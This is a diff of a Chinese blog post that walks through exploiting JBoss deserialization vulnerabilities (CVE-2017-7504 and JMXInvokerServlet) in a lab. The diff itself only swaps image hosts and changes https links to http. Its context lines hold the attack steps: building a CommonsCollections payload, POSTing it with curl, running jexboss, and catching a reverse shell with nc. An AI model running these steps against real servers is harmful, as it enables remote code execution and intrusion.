@@ -7,7 +7,7 @@ tags: JBoss
 
 #### 背景
 
-JBOSS是一个基于J2EE的[开放源代码](https://baike.baidu.com/item/开放源代码)的[应用服务器](https://baike.baidu.com/item/应用服务器)。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。
+JBOSS是一个基于J2EE的[开放源代码](http://baike.baidu.com/item/开放源代码)的[应用服务器](http://baike.baidu.com/item/应用服务器)。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。
 
 <!--more-->
 
@@ -26,7 +26,7 @@ Java反序列化错误类型引发该漏洞，存在于 Jboss 的 HttpInvoker �
 
 1.JBoss主页
 
-![](https://cdn.laohuan.art/jboss%E4%B8%BB%E9%A1%B5_2021-01-05_21-32-52.png)
+![](http://qn.laohuan.xin/jboss%E4%B8%BB%E9%A1%B5_2021-01-05_21-32-52.png)
 
 2.漏洞路径
 
@@ -34,11 +34,11 @@ Java反序列化错误类型引发该漏洞，存在于 Jboss 的 HttpInvoker �
 
 访问路径出现500错误，便可能出现此漏洞
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-05_21-40-22.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-05_21-40-22.png)
 
 3.工具
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-05_21-37-53.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-05_21-37-53.png)
 
 #### 反序列化(CVE-2017-7504)
 
@@ -58,7 +58,7 @@ Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器�
 
 1.工具套件
 
-- [https://github.com/joaomatosf/JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)
+- [http://github.com/joaomatosf/JavaDeserH2HC](http://github.com/joaomatosf/JavaDeserH2HC)
 
 2.`javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java`
 
@@ -74,11 +74,11 @@ Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器�
 
 5.`curl http://192.168.0.108:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser`
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-05_22-45-44.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-05_22-45-44.png)
 
 6.获得shell
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-05_22-41-52.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-05_22-41-52.png)
 
 #### JBoss JMXInvokerServlet 反序列化漏洞
 
@@ -94,21 +94,21 @@ Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器�
 
 1.工具
 
-[[DeserializeExploit.jar](https://cdn.vulhub.org/deserialization/DeserializeExploit.jar)]
+[[DeserializeExploit.jar](http://cdn.vulhub.org/deserialization/DeserializeExploit.jar)]
 
 2.工具
 
-[https://github.com/joaomatosf/jexboss](https://github.com/joaomatosf/jexboss)
+[http://github.com/joaomatosf/jexboss](http://github.com/joaomatosf/jexboss)
 
 `python jexboss.py -u http://192.168.0.108:8080`
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-06_23-13-47.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-06_23-13-47.png)
 
 输入yes
 
 填写反弹IP端口
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-06_23-15-01.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-06_23-15-01.png)
 
 启动NC监听
 
@@ -116,13 +116,13 @@ Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器�
 
 反弹成功
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-06_23-12-50.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-06_23-12-50.png)
 
 参考链接
 
-- [https://github.com/vulhub/vulhub/tree/master/jboss](https://github.com/vulhub/vulhub/tree/master/jboss)
-- [https://www.pianshen.com/article/11401315597/](https://www.pianshen.com/article/11401315597/)
-- [https://www.cnblogs.com/yuzly/p/11240101.html](https://www.cnblogs.com/yuzly/p/11240101.html)
-- [https://www.cnblogs.com/iamver/p/11282928.html](https://www.cnblogs.com/iamver/p/11282928.html)
-- [https://www.cnblogs.com/sevck/p/7874438.html](https://www.cnblogs.com/sevck/p/7874438.html)
+- [http://github.com/vulhub/vulhub/tree/master/jboss](http://github.com/vulhub/vulhub/tree/master/jboss)
+- [http://www.pianshen.com/article/11401315597/](http://www.pianshen.com/article/11401315597/)
+- [http://www.cnblogs.com/yuzly/p/11240101.html](http://www.cnblogs.com/yuzly/p/11240101.html)
+- [http://www.cnblogs.com/iamver/p/11282928.html](http://www.cnblogs.com/iamver/p/11282928.html)
+- [http://www.cnblogs.com/sevck/p/7874438.html](http://www.cnblogs.com/sevck/p/7874438.html)
 
